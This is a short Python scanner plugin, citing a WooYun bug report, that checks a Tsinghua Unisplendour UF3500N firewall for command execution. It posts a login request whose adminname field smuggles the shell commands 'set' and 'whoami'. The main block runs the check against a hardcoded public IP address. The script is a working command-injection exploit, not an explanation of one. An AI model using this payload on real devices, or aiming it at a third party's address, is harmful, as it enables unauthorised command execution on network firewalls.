#!/usr/bin/env python
#-*- coding:utf-8 -*-
#info:http://www.wooyun.org/bugs/wooyun-2010-0115756
import urlparse
def assign(service, arg):
    if service == "unis_gateway":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)


def audit(arg):
    url = arg + 'cgi-bin/admin_login.cgi'
    postdata = "login=%b9%dc%c0%ed%d4%b1%b5%c7%c2%bc&adminname=%22set%7cset%26whoami%22&adminpasswd=123456"
    code, head, res, errcode, _ = curl.curl2(url,post=postdata)
    if code==200 and 'DOCUMENT_ROOT' in res:
        security_hole("清华紫光UF3500N防火墙2.70版命令执行:http://www.wooyun.org/bugs/wooyun-2010-0115756")

if __name__ == '__main__':
    from dummy import *
    audit(assign('unis_gateway', 'https://125.46.98.90/')[1])